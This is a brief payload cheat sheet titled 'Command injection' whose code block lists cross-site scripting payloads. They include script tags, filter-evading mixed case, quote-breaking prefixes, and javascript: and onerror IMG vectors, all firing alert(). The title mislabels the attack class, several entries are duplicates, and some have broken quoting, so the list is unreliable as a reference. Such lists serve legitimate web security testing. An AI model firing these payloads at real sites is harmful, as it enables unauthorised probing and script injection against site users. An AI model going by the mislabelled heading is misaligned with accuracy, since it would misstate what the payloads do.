# Command injection

### Payload

```js
<script>alert(123)</script>
<ScRipT>alert("XSS")</ScRipT>
<script>alert(123)</script>
<script>alert("hellox worldss")</script>
<script>alert('XSS')</script> 
<script>alert('XSS')</script>
<script>alert('XSS')</script>
'><script>alert('XSS')</script>
<script>alert(/XSS/)</script>
<script>alert(/XSS/)</script>
</script><script>alert(1)</script>
' alert(1)
')alert(1)//
<ScRiPt>alert(1)</sCriPt>
<IMG SRC=jAVasCrIPt:alert('XSS')>
<IMG SRC='javascript:alert('XSS')'>
<IMG SRC=javascript:alert(&quotXSS&quot)>
<IMG SRC=javascript:alert('XSS')>      
<img src=xss onerror=alert(1)>
```